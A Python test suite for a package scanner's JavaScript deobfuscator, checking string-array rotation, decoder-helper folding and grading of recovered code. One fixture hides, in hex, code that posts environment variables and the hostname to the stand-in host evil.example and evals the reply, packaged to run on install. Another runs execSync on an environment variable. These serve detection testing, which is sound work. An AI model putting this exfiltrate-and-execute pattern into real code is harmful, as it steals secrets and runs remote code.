"""Obfuscation reversed statically, and graded by what the recovered code does (review 98).

The fixtures are built here, from harmless strings, in the shape javascript-obfuscator writes: a
string array, a rotation loop whose `parseInt` checksum names the right arrangement, and a decoder
reached through an alias. Nothing is run, in the test or in the code under test.
"""

from __future__ import annotations

import base64
import io
import json
import tarfile
import time
from pathlib import Path
from typing import ClassVar

from cordon_scanner import Scanner
from cordon_scanner.analysis.shared.deobfuscation import (
    OBFUSCATOR_IO_ALPHABET,
    STANDARD_ALPHABET,
    Checksum,
    Layers,
    ObfuscatorIo,
)
from cordon_scanner.analysis.shared.deobfuscator import Deobfuscator
from cordon_scanner.decide.policy import PolicyGate
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.models import Severity


class ObfuscatedKit:
    STRINGS: ClassVar[list[str]] = [
        "log",
        "hello\x20world",
        "1203abc",
        "27xyz",
        "9q",
        "length",
        "4lm",
        "exports",
    ]
    # The obfuscator's names are hexadecimal (`_0x5e1f`); readable stand-ins are swapped in below.
    OFFSET = 0x1A2
    SHIFT = 3

    @staticmethod
    def encode(value: str) -> str:
        """obfuscator.io's base64: standard base64 written in its own alphabet."""
        table = str.maketrans(STANDARD_ALPHABET[:64], OBFUSCATOR_IO_ALPHABET[:64])
        return base64.b64encode(value.encode()).decode().rstrip("=").translate(table)

    @classmethod
    def program(cls, mode: str = "plain", body: str = "") -> str:
        values = [cls.encode(s) if mode == "base64" else s for s in cls.STRINGS]
        # The array as shipped is the decoded order rotated back by SHIFT; the loop undoes it.
        shipped = values[-cls.SHIFT :] + values[: -cls.SHIFT]
        index = {s: cls.OFFSET + i for i, s in enumerate(cls.STRINGS)}
        terms = [("1203abc", 1), ("27xyz", 2), ("9q", 3), ("4lm", 4)]
        expression = "+".join(f"parseInt(_0xd(0x{index[s]:x}))/0x{d:x}" for s, d in terms)
        target = Checksum(expression).value(lambda fn, args: cls.STRINGS[int(args[0]) - cls.OFFSET])
        decode = f"var _0xa='{OBFUSCATOR_IO_ALPHABET}';" if mode == "base64" else ""
        quoted = ",".join(f"'{v}'" for v in shipped)
        return (
            (
                f"function _0xarr(){{const _0xl=[{quoted}];_0xarr=function(){{return _0xl;}};return _0xarr();}}"
                f"function _0xdec(_0xi,_0xk){{const _0xs=_0xarr();return _0xdec=function(_0xn,_0xm)"
                f"{{_0xn=_0xn-0x{cls.OFFSET:x};{decode}let _0xv=_0xs[_0xn];return _0xv;}},_0xdec(_0xi,_0xk);}}"
                f"(function(_0xf,_0xt){{const _0xd=_0xdec,_0xa=_0xf();while(!![]){{try{{const _0xc={expression};"
                f"if(_0xc===_0xt)break;else _0xa['push'](_0xa['shift']());}}catch(_0xe){{_0xa['push']"
                f"(_0xa['shift']());}}}}}}(_0xarr,{target:g}));"
                f"const _0xq=_0xdec;console[_0xq(0x{index['log']:x})](_0xq(0x{index['hello world']:x}));"
                f"{body}"
            )
            .replace("_0xarr", "_0x5e1f")
            .replace("_0xdec", "_0x2c4d")
            .replace("_0xl=", "_0x3a1b=")
            .replace("_0xl;", "_0x3a1b;")
            .replace("_0xs", "_0x6b2e")
            .replace("_0xv", "_0x7c3f")
            .replace("_0xq", "_0x4d5a")
            .replace("_0xc=", "_0x1e9b=")
            .replace("_0xc===", "_0x1e9b===")
        )

    @classmethod
    def package(cls, tmp_path: Path, program: str) -> Path:
        files = {
            # Run on install, so the obfuscation finding starts at the gate.
            "package/package.json": json.dumps(
                {
                    "name": "obf-demo",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "node index.js"},
                }
            ),
            "package/index.js": program,
        }
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for member, text in files.items():
                data = text.encode()
                info = tarfile.TarInfo(member)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        target = tmp_path / "obf-demo-1.0.0.tgz"
        target.write_bytes(buffer.getvalue())
        return target


class TestTheStringArray:
    def test_a_plain_array_is_rotated_by_its_checksum_and_substituted(self):
        recovery = ObfuscatorIo.recover(ObfuscatedKit.program())
        assert recovery is not None
        assert "console.log('hello world')" in recovery.text
        # The decoder calls itself with its own parameters; that call has no literal to resolve.
        assert recovery.remaining <= 2

    def test_a_base64_array_is_decoded(self):
        recovery = ObfuscatorIo.recover(ObfuscatedKit.program("base64"))
        assert recovery is not None
        assert "console.log('hello world')" in recovery.text

    def test_a_file_with_no_array_is_left_alone(self):
        assert ObfuscatorIo.recover("const a = 1; while(!![]){ break; }") is None


class TestLayers:
    def test_an_invisible_run_is_read_as_the_bytes_it_spells(self):
        hidden = "".join(
            chr(0xE0100 + b - 16) if b >= 16 else chr(0xFE00 + b) for b in b"console.log(1)//pad"
        )
        text, layers = Layers.peel(f"const s='{hidden}'; run(s);")
        assert layers == 1
        assert "console.log(1)" in text

    def test_constant_decodes_are_peeled_and_unreadable_ones_are_not(self):
        encoded = base64.b64encode(b"console.log('second layer')").decode()
        assert Layers.decoded(f"eval(atob('{encoded}'))") == [
            ("atob", "console.log('second layer')")
        ]
        assert Layers.decoded("atob('AAECAwQFBgcICQoLDA0ODw==')") == []


class TestGrading:
    def test_the_obfuscation_keeps_its_grade_whatever_the_recovered_code_does(self, tmp_path):
        # Compromised releases whose payload sits elsewhere recover to inert code; the hiding is
        # still the finding (review 98: @draftlab/auth 0.24.2).
        config = Config.default().with_overrides(use_cache=False)
        result = Scanner(config).scan(ObfuscatedKit.package(tmp_path, ObfuscatedKit.program()))
        packed = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.PACKED.001"]
        assert packed
        assert any(f.severity >= Severity.HIGH for f in packed)

    def test_what_the_recovered_code_does_is_reported_on_it(self, tmp_path):
        body = "require('child_process').execSync(process.env.HOME_CMD);"
        config = Config.default().with_overrides(use_cache=False)
        result = Scanner(config).scan(
            ObfuscatedKit.package(tmp_path, ObfuscatedKit.program(body=body))
        )
        assert any("#deobfuscated.js" in (f.location.path or "") for f in result.findings) or any(
            f.location.path and f.location.path.endswith("index.js") for f in result.findings
        )

    def test_recovered_text_with_another_hidden_layer_keeps_the_grade(self, tmp_path):
        encoded = base64.b64encode(b"console.log('next')").decode()
        program = ObfuscatedKit.program(body=f"eval(Buffer.from('{encoded}','base64').toString());")
        config = Config.default().with_overrides(use_cache=False)
        result = Scanner(config).scan(ObfuscatedKit.package(tmp_path, program))
        assert not PolicyGate.evaluate(result, config.policy).passed

    def test_the_recovery_entry_point_handles_only_javascript(self):
        assert Deobfuscator.recover(ObfuscatedKit.program(), "python") is None


class TestIntegerLiterals:
    """Source integers as Go and sloppy-mode JavaScript read them."""

    def test_forms(self) -> None:
        from cordon_scanner.analysis.shared.deobfuscation import IntegerLiteral

        assert IntegerLiteral.value("05") == 5
        assert IntegerLiteral.value("0101") == 65
        assert IntegerLiteral.value("089") == 89
        assert IntegerLiteral.value("0x41") == 65
        assert IntegerLiteral.value("0o17") == 15
        assert IntegerLiteral.value("1_000") == 1000
        assert IntegerLiteral.value("0") == 0


class Hex:
    @staticmethod
    def of(value: str) -> str:
        return value.encode().hex()


class TestDecoderHelpers:
    """Item 41: a local function that is one known decode of its parameter, and its calls."""

    HEX = "function g (h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))) }\n"

    def _folded(self, source: str) -> str:
        recovery = Deobfuscator.recover(source, "javascript")
        assert recovery is not None
        return recovery.text

    def test_the_hex_pair_helper_names_its_module_and_member(self):
        text = self._folded(
            self.HEX + f"require(g('{Hex.of('axios')}'))[g('{Hex.of('post')}')](u);"
        )
        assert "require('axios')['post'](u)" in text

    def test_the_sample_shape_array_of_calls_read_by_index(self):
        source = (
            self.HEX
            + f"const hl = [g('{Hex.of('axios')}'), g('{Hex.of('post')}')];\nrequire(hl[0]);"
        )
        assert "const hl = ['axios', 'post']" in self._folded(source)

    def test_each_helper_spelling(self):
        call = f"g('{Hex.of('abc')}')"
        arrow = "const g = h => h.replace(/../g, m => String.fromCharCode(parseInt(m, 16)));"
        expression = (
            "const g = function (h) { return h.replace(/../g, (m) => "
            "String.fromCharCode(parseInt(m, 16))); };"
        )
        local = (
            "function g (h) { const s = h.replace(/../g, m => "
            "String.fromCharCode(parseInt(m, 16))); return s }"
        )
        for definition in (arrow, expression, local):
            assert "'abc'" in self._folded(f"{definition}\nuse({call});")

    def test_a_method_of_an_object_literal(self):
        source = (
            "const o = { d(h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))) } };\n"
            f"use(o.d('{Hex.of('abc')}'));"
        )
        assert "use('abc')" in self._folded(source)

    def test_a_constant_argument(self):
        assert "use('abc')" in self._folded(self.HEX + f"const H = '{Hex.of('abc')}';\nuse(g(H));")

    def test_two_layers_fold(self):
        source = (
            self.HEX
            + "const k = s => s.split('').reverse().join('');\n"
            + f"use(g(k('{Hex.of('abc')[::-1]}')));"
        )
        assert "use('abc')" in self._folded(source)

    def test_every_decode_form(self):
        raw = base64.b64encode(b"hello there").decode()
        cases = {
            "const g = h => Buffer.from(h, 'hex').toString();": Hex.of("hello there"),
            "const g = h => Buffer.from(h, 'base64').toString('utf8');": raw,
            "const g = h => atob(h);": raw,
            "const g = h => String.fromCharCode(...h);": "[104, 105, 33]",
            "const g = h => h.map(c => String.fromCharCode(c)).join('');": "[104, 105, 33]",
            "const g = h => h.split('').reverse().join('');": "olleh",
        }
        expected = ["hello there", "hello there", "hello there", "hi!", "hi!", "hello"]
        for (definition, argument), want in zip(cases.items(), expected, strict=True):
            literal = argument if argument.startswith("[") else f"'{argument}'"
            assert f"use('{want}')" in self._folded(f"{definition}\nuse(g({literal}));"), definition

    def test_a_helper_that_is_not_a_known_decode_is_left_alone(self):
        table = "const T = {a: 'x'}; function g (h) { return T[h]; }\nuse(g('a'));"
        key = "function g (h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16) ^ KEY)) }"
        assert Deobfuscator.recover(table, "javascript") is None
        assert Deobfuscator.recover(key + "\nuse(g('6162'));", "javascript") is None

    def test_a_name_defined_twice_is_not_trusted(self):
        source = self.HEX + "function g (h) { return h }\n" + f"use(g('{Hex.of('abc')}'));"
        assert Deobfuscator.recover(source, "javascript") is None

    def test_bounds(self):
        from cordon_scanner.analysis.shared.decoder_helpers import DecoderHelpers

        assert DecoderHelpers.decode("hex_pairs", Hex.of("a") * 3000) is None
        assert (
            Deobfuscator.recover(self.HEX + f"use(g('{Hex.of(chr(1) * 4)}'));", "javascript")
            is None
        )
        assert Deobfuscator.recover(self.HEX + "use(g('zz'));", "javascript") is None

    def test_a_decode_that_raises_leaves_the_file_unlifted(self, monkeypatch):
        from cordon_scanner.analysis.shared.decoder_helpers import DecoderHelpers

        def boom(*args, **kwargs):
            raise ValueError("hostile")

        monkeypatch.setattr(DecoderHelpers, "_pass", boom)
        assert Deobfuscator.recover(self.HEX + f"use(g('{Hex.of('abc')}'));", "javascript") is None

    def test_the_decoded_flow_is_judged_by_the_existing_rules(self, tmp_path):
        source = (
            self.HEX
            + "const data = { ...process.env, host: require('os').hostname() };\n"
            + f"const hl = [g('{Hex.of('axios')}'), g('{Hex.of('post')}'), g('{Hex.of('https://evil.example/x')}')];\n"
            + "module.exports = () => require(hl[0])[[hl[1]]](hl[2], data).then(r => eval(r.data));\n"
        )
        config = Config.default().with_overrides(use_cache=False)
        result = Scanner(config).scan(ObfuscatedKit.package(tmp_path, source))
        lifted = {
            f.rule_id for f in result.findings if "#deobfuscated.js" in (f.location.path or "")
        }
        assert {"MALWARE.DROPPER.001", "MALWARE.EXFIL.BEACON.001"} <= lifted
        assert not PolicyGate.evaluate(result, config.policy).passed

    def test_a_literal_index_of_a_constant_array_and_a_computed_key_array_are_read(self):
        source = (
            self.HEX
            + f"const hl = [g('{Hex.of('axios')}'), g('{Hex.of('post')}')];\n"
            + "use(hl[0], x[[hl[1]]]); let n = hl[5];"
        )
        text = self._folded(source)
        assert "use('axios', x['post'])" in text
        assert "hl[5]" in text

    def test_an_array_declared_twice_is_not_indexed(self):
        source = (
            self.HEX
            + f"const hl = [g('{Hex.of('axios')}')];\nfunction f(){{ const hl = []; }}\nuse(hl[0]);"
        )
        assert "use(hl[0])" in self._folded(source)

    def test_a_benign_decode_that_reaches_no_sink_does_not_block(self, tmp_path):
        source = self.HEX + f"module.exports = () => console.log(g('{Hex.of('hello world')}'));\n"
        config = Config.default().with_overrides(use_cache=False)
        result = Scanner(config).scan(ObfuscatedKit.package(tmp_path, source))
        assert not [
            f for f in result.findings if f.rule_id.startswith("MALWARE.") or "DROPPER" in f.rule_id
        ]

    def test_a_method_is_folded_only_on_its_own_object(self):
        source = (
            "const o = { d(h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))) } };\n"
            f"use(o.d('{Hex.of('abc')}'), other.d('{Hex.of('abc')}'), d('{Hex.of('abc')}'));"
        )
        text = self._folded(source)
        assert f"use('abc', other.d('{Hex.of('abc')}'), d('{Hex.of('abc')}'))" in text

    def test_a_helper_that_is_assigned_again_is_not_trusted(self):
        source = self.HEX + f"g = function (x) {{ return x; }};\nuse(g('{Hex.of('abc')}'));"
        assert Deobfuscator.recover(source, "javascript") is None

    def test_work_is_bounded_on_hostile_input(self):
        arrays = "".join(f"const a{i} = ['p{i}'];\n" for i in range(300))
        reads = f"use(a0[0], a299[0], g('{Hex.of('abc')}'));"
        text = self._folded(self.HEX + arrays + reads)
        assert "use('p0', a299[0], 'abc')" in text
        calls = "use(g(v));" * 60_000
        assert (
            Deobfuscator.recover(self.HEX + calls + f"use(g('{Hex.of('abc')}'));", "javascript")
            is None
        )

    def test_a_bundle_of_methods_costs_in_proportion_to_its_size(self):
        """CPU time, never wall time: four times the methods costs far less than sixteen times."""

        def cost(methods: int) -> float:
            body = "".join(f"m{i}(a){{return a+{i}}}," for i in range(methods))
            source = self.HEX + "const o = {" + body + "};\n" + f"use(g('{Hex.of('abc')}'));"
            started = time.process_time()
            recovery = Deobfuscator.recover(source, "javascript")
            elapsed = time.process_time() - started
            assert recovery is not None
            assert "use('abc')" in recovery.text
            return elapsed

        cost(1_000)
        small, large = cost(20_000), cost(80_000)
        assert large < max(small, 0.05) * 12
